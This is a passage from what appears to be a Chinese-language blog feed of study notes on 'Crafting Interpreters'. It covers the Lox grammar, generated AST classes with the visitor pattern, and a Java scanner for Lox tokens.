class="string">&quot;/&quot;</span> ;</span><br></pre></td></tr></table></figure><p>以下是一个表达式的例子。1是NUMBER，-是operator（在binary中）之后是binary中左侧的grouping，内部包含了一个新的expression。再之后是右侧的expression，是&lt;4的标志，然后其实这整个还是作为一个大的binary的，因为用等号将两边连接起来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> - (<span class="number">2</span> * <span class="number">3</span>) &lt; <span class="number">4</span> == false</span><br></pre></td></tr></table></figure><p>为了用面向对象的方式将这些表达式写出来，如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.craftinginterpreters.lox;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Expr</span> &#123; </span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Binary</span> <span class="keyword">extends</span> <span class="title class_">Expr</span> &#123;</span><br><span class="line">    Binary(Expr left, Token operator, Expr right) &#123;</span><br><span class="line">      <span class="built_in">this</span>.left = left;</span><br><span class="line">      <span class="built_in">this</span>.operator = operator;</span><br><span class="line">      <span class="built_in">this</span>.right = right;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> Expr left;</span><br><span class="line">    <span class="keyword">final</span> Token operator;</span><br><span class="line">    <span class="keyword">final</span> Expr right;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Other expressions...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以一个一个手写，但是作者给了我们一个简单的方法，用脚本自动生成。这里碰到一个问题卡了很久。。就是新建一个tool的包知乎，eclipse里面就不能直接运行代码了，必须用java运行。</p><p><img src="/2022/08/07/crafting-interpreters3/image-20220808132423827.png" alt="image-20220808132423827"></p><p>折磨了一个小时，还是没找到解决办法。但是没有关系，毕竟这个tool还是一个命令行工具。参考<a href="https://www.zhihu.com/question/36537093">链接</a>下的做法，编译得到一个新文件<code>expr.java</code>。</p><p>具体的方法是先在lox/ 下面生成一个.class文件，如下</p><p><img src="/2022/08/07/crafting-interpreters3/image-20230209174707420.png" alt="image-20230209174707420"></p><p>之后到src/下面去生成</p><p><img src="/2022/08/07/crafting-interpreters3/image-20230209174727456.png" alt="image-20230209174727456"></p><p>这里我把GenerateAst移动到了lox/下面，不然总是报找不到主类的错误</p><h2 id="visitor-mode"><a href="#visitor-mode" class="headerlink" title="visitor mode"></a>visitor mode</h2><p>访问者模式。作者举了一个例子，我们在设计不同类时，如果想要<code>横向</code>的添加一层，非常容易，但是如果纵向添加一层，则困难许多。</p><p><img src="/2022/08/07/crafting-interpreters3/image-20220808141935572.png" alt="横向添加"></p><p><img src="/2022/08/07/crafting-interpreters3/image-20220808141952286.png" alt="纵向添加"></p><p>因为纵向添加往往意味着对于每一个类，都要添加一个新的成员函数。而有一种解决方案被称为访问者模式。<a href="https://refactoringguru.cn/design-patterns/visitor">这个网站写的很详细</a></p><blockquote><p>访问者模式建议将新行为放入一个名为<em>访问者</em>的独立类中， 而不是试图将其整合到已有类中。 现在， 需要执行操作的原始对象将作为参数被传递给访问者中的方法， 让方法能访问对象所包含的一切必要数据。</p></blockquote><p>在我们编写的tool.GenerateAST中，对应的代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">&lt;R&gt; R <span class="title function_">accept</span><span class="params">(Visitor&lt;R&gt; visitor)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> visitor.visitBinaryExpr(<span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>个人理解:就是为了防止在每个类中都加入新的内容，所以用一个visitor，这个visitor可以定义一些能够操纵类内部数据的函数，然后我们如果想要在类中添加新的细节，不需要重写所有类，只需要将类中需要修改的函数指向这个visitor即可。</p><p>以下时生成的类。可以看到基本规则就是填上每一种表达式的拆分后的细节，以及创建一些visitor。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> lox;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Expr</span> &#123;</span><br><span class="line">  <span class="keyword">interface</span> <span class="title class_">Visitor</span>&lt;R&gt; &#123;</span><br><span class="line">    R <span class="title function_">visitBinaryExpr</span><span class="params">(Binary expr)</span>;</span><br><span class="line">    R <span class="title function_">visitGroupingExpr</span><span class="params">(Grouping expr)</span>;</span><br><span class="line">    R <span class="title function_">visitLiteralExpr</span><span class="params">(Literal expr)</span>;</span><br><span class="line">    R <span class="title function_">visitUnaryExpr</span><span class="params">(Unary expr)</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Binary</span> <span class="keyword">extends</span> <span class="title class_">Expr</span> &#123;</span><br><span class="line">    Binary(Expr left, Token operator, Expr right) &#123;</span><br><span class="line">      <span class="built_in">this</span>.left = left;</span><br><span class="line">      <span class="built_in">this</span>.operator = operator;</span><br><span class="line">      <span class="built_in">this</span>.right = right;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    &lt;R&gt; R <span class="title function_">accept</span><span class="params">(Visitor&lt;R&gt; visitor)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> visitor.visitBinaryExpr(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> Expr left;</span><br><span class="line">    <span class="keyword">final</span> Token operator;</span><br><span class="line">    <span class="keyword">final</span> Expr right;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Grouping</span> <span class="keyword">extends</span> <span class="title class_">Expr</span> &#123;</span><br><span class="line">    Grouping(Expr expression) &#123;</span><br><span class="line">      <span class="built_in">this</span>.expression = expression;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    &lt;R&gt; R <span class="title function_">accept</span><span class="params">(Visitor&lt;R&gt; visitor)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> visitor.visitGroupingExpr(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> Expr expression;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Literal</span> <span class="keyword">extends</span> <span class="title class_">Expr</span> &#123;</span><br><span class="line">    Literal(Object value) &#123;</span><br><span class="line">      <span class="built_in">this</span>.value = value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    &lt;R&gt; R <span class="title function_">accept</span><span class="params">(Visitor&lt;R&gt; visitor)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> visitor.visitLiteralExpr(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> Object value;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Unary</span> <span class="keyword">extends</span> <span class="title class_">Expr</span> &#123;</span><br><span class="line">    Unary(Token operator, Expr right) &#123;</span><br><span class="line">      <span class="built_in">this</span>.operator = operator;</span><br><span class="line">      <span class="built_in">this</span>.right = right;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    &lt;R&gt; R <span class="title function_">accept</span><span class="params">(Visitor&lt;R&gt; visitor)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> visitor.visitUnaryExpr(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> Token operator;</span><br><span class="line">    <span class="keyword">final</span> Expr right;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">abstract</span> &lt;R&gt; R <span class="title function_">accept</span><span class="params">(Visitor&lt;R&gt; visitor)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>感觉这一章主要就是介绍了LOX语法的表示细节，然后创建了一个用于生成表达式类的tool。</p>]]></content>
      
      
      <categories>
          
          <category> interpreter </category>
          
      </categories>
      
      
        <tags>
            
            <tag> interpreter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>crafting-interpreters2——scanning</title>
      <link href="/2022/08/04/crafting-interpreters2/"/>
      <url>/2022/08/04/crafting-interpreters2/</url>
      
        <content type="html"><![CDATA[<p>关于编译器学习的第二课，这次介绍了一个和C语言风格极其类似的LOX语言。后面我们要实现的编译器就和这个语言相关。</p><p>此外本篇还介绍了关于tree-walk interpreter中，scanner的代码原理部分。</p><span id="more"></span><p>首先文章介绍了lox语言，但是显然我们没有他的编译器。可以在线下载。我们要实现的语言是弱类型的，也就是一个变量可以存放很多种类的数据，此外，关于运行时变量处理，通常有两种方法，一个是引用计数(存在的问题是对于循环，将会很难处理变量计数问题)，另一个是GC。我们将要实现的是一个自己的GC。</p><h1 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h1><p>LOX语言有很简单的几种变量类型，看起来有点类似python。</p><ol><li>booleans</li><li>numbers(十进制，八进制等等)</li><li>strings</li><li>nil (等同于null)</li></ol><h1 id="expression"><a href="#expression" class="headerlink" title="expression"></a>expression</h1><p>表达式分为几种，算术表达式、比较表达式，逻辑表达式</p><p>lox语言支持加减乘除的双目算术表达式。单目以及三目表达式。</p><p>比较表达式也是支持正常的大于小于等于，不等这些。在这些比较部分中，一般不涉及隐式转换。</p><p>逻辑表达式包含and 和or，这部分和python的类似，不在说明了。</p><p>Lox语言表达式中和C不同得地方在于没有位操作。比方说bitwise move, xor等等。</p><h1 id="闭包-closure"><a href="#闭包-closure" class="headerlink" title="闭包(closure)"></a>闭包(closure)</h1><p>这里提到了LOX语言的一个神奇的特性。<strong>热河函数可以被当作变量传递</strong>。这就会导致以下问题。</p><p><img src="/2022/08/04/crafting-interpreters2/image-20220801163746371.png" alt="image-20220801163746371"></p><p>比如上面的例子，返回的fn将会是inner()但是他要输出outside这个变量，但是它是在函数外部定义的。此时inner确实还可以访问得到这个数据。这种技术就是closure()</p><blockquote><p>For that to work, <code>inner()</code> has to “hold on” to references to any surrounding variables that it uses so that they stay around even after the outer function has returned. We call functions that do this <strong>closures</strong>. </p></blockquote><h1 id="tree-walk-interpreter"><a href="#tree-walk-interpreter" class="headerlink" title="tree walk interpreter"></a>tree walk interpreter</h1><p>前面的lox语言由于和C相关性太强，其他和C相同的地方我就没有详细写。这里直接开始写tree-walk机制。</p><p>我们首先将会用少于2000行代码的量构建一个完整的LOX编译器。首先将会介绍的是scanning，parsing和evaluating code。</p><h2 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h2><p>首先编写一个编译器框架，如下所示。简单来说就是一个runFile(通过文件输入)，另一个runPrompt(通过命令行交互输入)。另外还有一个报错退出的标志。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jlox</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (args.length &gt; <span class="number">1</span>) &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Usage: jlox [script]&quot;</span>);</span><br><span class="line">      System.exit(<span class="number">64</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (args.length == <span class="number">1</span>) &#123;</span><br><span class="line">      runFile(args[<span class="number">0</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      runPrompt();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来编写runFiel和runPrompt，对于runFile，主要的功能就是通过字节读取的方式阅读文件，之后调用run()。对于run()我们目前没有添加新的内容，仅仅是打印出字节码。(当然还要使用到后面的scanner库和token库)。对于runPrompt，主要功能是接受从命令行输入的每一行的内容，并调用run()。</p><h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2><p>错误处理的原则是：产生错误的地方和汇报错误的地方要尽量分开。因此lox语言在run()中放置了错误处理函数。如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">runFile</span><span class="params">(String path)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(path));</span><br><span class="line">    run(<span class="keyword">new</span> <span class="title class_">String</span>(bytes, Charset.defaultCharset()));</span><br><span class="line"><span class="comment">// Indicate an error in the exit code.</span></span><br><span class="line">    <span class="keyword">if</span> (hadError) System.exit(<span class="number">65</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="词法分析-定位"><a href="#词法分析-定位" class="headerlink" title="词法分析\定位"></a>词法分析\定位</h2><p>词法分析就是把当前的语句拆分成</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">var</span> <span class="variable">language</span> <span class="operator">=</span> <span class="string">&quot;lox&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/2022/08/04/crafting-interpreters2/image-20220804111114669.png" alt="image-20220804111114669"></p><p>拆分得到的一个一个小小块，称作token。token服务于parser，一般来说token中需要规定一些限定词，比如说<code>class</code>，<code>public</code>等。由此我们定义了一个常量表。</p><p>关于定位，就是当我们做词法分析时，将一行字拆分开来，分成type，lexeme，literal等部分。之后最有用的地方是报错分析时可以使用。</p><p>token的结构体为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Token(TokenType type, String lexeme, Object literal, <span class="type">int</span> line) &#123;</span><br><span class="line">    <span class="built_in">this</span>.type = type; <span class="comment">//比方说string，变量类型</span></span><br><span class="line">    <span class="built_in">this</span>.lexeme = lexeme; <span class="comment">// 直接substr()下的数值</span></span><br><span class="line">    <span class="built_in">this</span>.literal = literal; <span class="comment">// 字面数值,对于字符串，就是去掉引号的部分</span></span><br><span class="line">    <span class="built_in">this</span>.line = line;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="处理语言和表达式"><a href="#处理语言和表达式" class="headerlink" title="处理语言和表达式"></a>处理语言和表达式</h2><p>scanner负责处理我们输入的字符串。他从我们输入的第一个byte开始处理，分析每一个字符隶属于哪一个<code>lexeme</code>，并一直处理到文件末尾。</p><p>比方说对于变量名称，我们是通过一种<code>lexical grammar</code>进行分析的，这种语言很像正则表达式。</p><p>我们首先构建scanner，其源代码如下。我们建立一个list用来存放所有的token，并且后续scanner的工作就是把输入的字符串语句解析成token放在这个list中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Scanner</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> String source;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> List&lt;Token&gt; tokens = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">  Scanner(String source) &#123;</span><br><span class="line">    <span class="built_in">this</span>.source = source;</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 不停进行扫描</span></span><br><span class="line">    List&lt;Token&gt; <span class="title function_">scanTokens</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (!isAtEnd()) &#123;</span><br><span class="line">      <span class="comment">// We are at the beginning of the next lexeme.</span></span><br><span class="line">      start = current;</span><br><span class="line">      scanToken();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tokens.add(<span class="keyword">new</span> <span class="title class_">Token</span>(EOF, <span class="string">&quot;&quot;</span>, <span class="literal">null</span>, line));</span><br><span class="line">    <span class="keyword">return</span> tokens;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来我们开始识别词法。首先对于加减乘除等表达式，我们可以直接用seitch:case的方法匹配。首先取出下一个字符，之后与后面的字符匹配，并向token列表中加入对应的内容(token名称，行数)即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">scanToken</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> advance();</span><br><span class="line">  <span class="keyword">switch</span> (c) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;(&#x27;</span>: addToken(LEFT_PAREN); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;)&#x27;</span>: addToken(RIGHT_PAREN); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;&#123;&#x27;</span>: addToken(LEFT_BRACE); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;&#125;&#x27;</span>: addToken(RIGHT_BRACE); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;,&#x27;</span>: addToken(COMMA); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;.&#x27;</span>: addToken(DOT); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>: addToken(MINUS); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>: addToken(PLUS); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;;&#x27;</span>: addToken(SEMICOLON); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>: addToken(STAR); <span class="keyword">break</span>; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来我们还要处理由两个符号构成的运算符，例如==，!=之类的。我们只需要在扫描到对应符号之后再扫描一位就能确定了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;!&#x27;</span>:</span><br><span class="line">addToken(match(<span class="string">&#x27;=&#x27;</span>) ? BANG_EQUAL : BANG);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">addToken(match(<span class="string">&#x27;=&#x27;</span>) ? EQUAL_EQUAL : EQUAL);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;&lt;&#x27;</span>:</span><br><span class="line">addToken(match(<span class="string">&#x27;=&#x27;</span>) ? LESS_EQUAL : LESS);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;&gt;&#x27;</span>:</span><br><span class="line">addToken(match(<span class="string">&#x27;=&#x27;</span>) ? GREATER_EQUAL : GREATER);</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>接下来还要处理一个特殊的符号，也就是除号。因为lox中，注释也是两条斜线构成的。基本思路很简单，如果找到两条斜线，就从这里到一行的结尾，我们都不需要管理，跳过即可。但是如果斜杠后面没有斜杠，就说明是除法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line"><span class="keyword">if</span> (match(<span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">    <span class="comment">// A comment goes until the end of the line.</span></span><br><span class="line">    <span class="keyword">while</span> (peek() != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; !isAtEnd()) advance();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    addToken(SLASH);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>除此以外，我们还可能碰到空格，换行符等等。这些我们直接简单跳过，或者跳过之后，对于line变量进行增加即可。</p><h2 id="处理数字和字符串"><a href="#处理数字和字符串" class="headerlink" title="处理数字和字符串"></a>处理数字和字符串</h2><h3 id="处理字符串"><a href="#处理字符串" class="headerlink" title="处理字符串"></a>处理字符串</h3><p>通过识别双引号，可以提取字符串。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">string</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (peek() != <span class="string">&#x27;&quot;&#x27;</span> &amp;&amp; !isAtEnd()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (peek() == <span class="string">&#x27;\n&#x27;</span>) line++;</span><br><span class="line">        advance();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isAtEnd()) &#123;</span><br><span class="line">        jlox.error(line, <span class="string">&quot;Unterminated string.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The closing &quot;.</span></span><br><span class="line">    advance();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Trim the surrounding quotes.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> source.substring(start + <span class="number">1</span>, current - <span class="number">1</span>);</span><br><span class="line">    addToken(STRING, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同理，在switch case中加上双引号的判断，并指向这里的string()函数，就能提取出一个string，并将其作为token加到token列表中。</p><h3 id="处理数字"><a href="#处理数字" class="headerlink" title="处理数字"></a>处理数字</h3><p>对于数字而言，我们只是识别是不是数字开头，一直到最后一个数字结尾。中间包含的小数点当然也会被提取。但是注意我们这种方法对于负数而言无能为力。我们只能把负数识别为一个表达式，并且把数字单独提取出来。</p><p>首先是识别数字</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (isDigit(c)) &#123;</span><br><span class="line">    number();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    jlox.error(line, <span class="string">&quot;Unexpected character.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>其中isDigit()具体内容为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isDigit</span><span class="params">(<span class="type">char</span> c)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> c &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;9&#x27;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>而number()主要目的就是提取出来数字，并把他放到token list中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">number</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (isDigit(peek())) advance();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Look for a fractional part.</span></span><br><span class="line">    <span class="keyword">if</span> (peek() == <span class="string">&#x27;.&#x27;</span> &amp;&amp; isDigit(peekNext())) &#123;</span><br><span class="line">        <span class="comment">// Consume the &quot;.&quot;</span></span><br><span class="line">        advance();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (isDigit(peek())) advance();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    addToken(NUMBER,</span><br><span class="line">             Double.parseDouble(source.substring(start, current)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实这里可以看到还是用到了java中对于数字进制转换的库。</p><h2 id="保留字符"><a href="#保留字符" class="headerlink" title="保留字符"></a>保留字符</h2><p>对于保留字符，我们肯定要用完全匹配的方法来确定(或者说是最长匹配)。一个例子就是对于—a的解释。如果采用较长匹配，得到的结果是– (-a)。</p><p>我们首先在switch case部分做以下判断</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 